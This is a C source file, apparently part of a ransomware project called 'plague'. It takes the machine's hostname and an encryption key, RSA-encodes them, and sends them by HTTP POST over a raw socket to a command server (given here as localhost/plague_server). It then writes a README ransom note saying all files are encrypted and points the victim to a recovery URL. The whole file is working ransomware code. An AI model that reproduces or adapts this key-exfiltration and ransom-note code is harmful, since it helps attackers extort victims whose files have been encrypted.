#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

#include "includes/plague.h"

void error(const char *msg)
{
    perror(msg);
    exit(0);
}

char *get_hostname()
{
    char hostname[1024];

    hostname[1023] = '\0';
    gethostname(hostname, 1023);
    return strdup(hostname);
}

void write_readme(char *id)
{
    FILE *fp;
    fp = fopen("README.txt","w+");
    fprintf(fp, "All your files are encrypted. Go to http://localhost/plague_server/?id=%s to know how to get your data recovered\n", id);
    fclose(fp);
}

int send_key(char *key, char *hostname)
{
    struct hostent *server;
    struct sockaddr_in serv_addr;
    int sockfd, bytes, sent, received, total;
    char json[1024], message[4096], response[20000]; // revoir les tailles
    size_t len = 0;
    int port = 80;
    unsigned char *data;
    char *host = "localhost";
    char *request = "POST /plague_server/ HTTP/1.1\r\n"
                    "Host: localhost\r\n"
                    "Content-Type: application/x-www-form-urlencoded\r\n"
                    "Content-Length: %d\r\n\r\n"
                    "data=%s";
    char *format = "{\"key\":\"%s\", \"hostname\":\"%s\"}";
    char *encoded;

    /* fill in the parameters */
    sprintf(json, format, key, hostname); // 21

    // encode data
    data = rsa_encode((unsigned char *)json, &len); //encode
    encoded = bin2hex(data, len);
    sprintf(message, request, strlen("data=") + strlen((char *)encoded), encoded);

    /* create the socket */
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0)
        error("ERROR opening socket");

    /* lookup the ip address */
    server = gethostbyname(host);
    if (server == NULL)
        error("ERROR, no such host");

    /* fill in the structure */
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    memcpy(&serv_addr.sin_addr.s_addr,server->h_addr, server->h_length);

    /* connect the socket */
    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
        error("ERROR connecting");

    /* send the request */
    total = strlen(message);
    sent = 0;
    do {
        bytes = write(sockfd, message + sent, total - sent);
        if (bytes < 0)
            error("ERROR writing message to socket");
        if (bytes == 0)
            break;
        sent += bytes;
    } while (sent < total);

    /* receive the response */
    memset(response, 0, sizeof(response));
    total = sizeof(response) - 1;
    received = 0;
    do {
        bytes = read(sockfd, response + received, total - received);
        if (bytes < 0)
            error("ERROR reading response from socket");
        if (bytes == 0)
            break;
        received += bytes;
    } while (received < total);
    if (received == total)
        error("ERROR storing complete response from socket");

    /* close the socket */
    close(sockfd);

    /* process response */
    char *id = strstr(response, "id:");
    if (!id)
        return 0;
    id = strtok(id, " \n");
    write_readme(&id[3]);
    return 0;
}